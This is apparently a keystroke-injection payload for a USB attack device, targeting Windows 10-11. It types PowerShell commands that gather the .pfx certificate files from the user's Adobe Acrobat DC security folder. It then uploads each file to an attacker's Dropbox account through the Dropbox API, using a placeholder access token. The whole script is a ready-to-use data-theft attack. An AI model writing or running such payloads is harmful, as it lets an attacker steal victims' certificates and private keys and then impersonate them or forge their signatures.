* ####################################################################
* #                                                                  |
* # Title        : Export all saved certificates with Adobe Reader   |
* # Author       : Aleff                                             |
* # Version      : 1.0                                               |
* # Category     : Exfiltration                                      |
* # Target       : Windows 10-11                                     |
* #                                                                  |
* ####################################################################


* Requirements:
*     - Adobe Reader must be installed
*     - Internet Connection


QUACK GUI r
QUACK DELAY 1000
QUACK STRING PowerShell
QUACK DELAY 2000

* Settings about Adobe Reader
QUACK STRING $roamingFolderPath = [Environment]::GetFolderPath('ApplicationData')
QUACK ENTER
QUACK STRING $securityFolderPath = Join-Path -Path $roamingFolderPath -ChildPath 'Adobe\Acrobat\DC\Security'
QUACK ENTER
QUACK STRING $pfxFiles = Get-ChildItem -Path $securityFolderPath -Filter '*.pfx' -File
QUACK ENTER

* You must define your Dropbox accessToken or modify the exfiltration modality.
QUACK STRING $accessToken = "DROPBOX_ACCESS_TOKEN"
QUACK ENTER
QUACK STRING $authHeader = @{Authorization = "Bearer $accessToken"}
QUACK ENTER
QUACK STRING $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
QUACK ENTER
QUACK STRING foreach ($file in $pfxFiles) {
QUACK ENTER
QUACK STRING $dropboxFilePath = "/$file"
QUACK ENTER
QUACK STRING $headers = @{}
QUACK ENTER
QUACK STRING $headers.Add("Authorization", "Bearer $accessToken")
QUACK ENTER
QUACK STRING $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
QUACK ENTER
QUACK STRING $headers.Add("Content-Type", "application/octet-stream")

QUACK ENTER
QUACK STRING Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $file
QUACK ENTER
QUACK STRING }; exit
QUACK ENTER
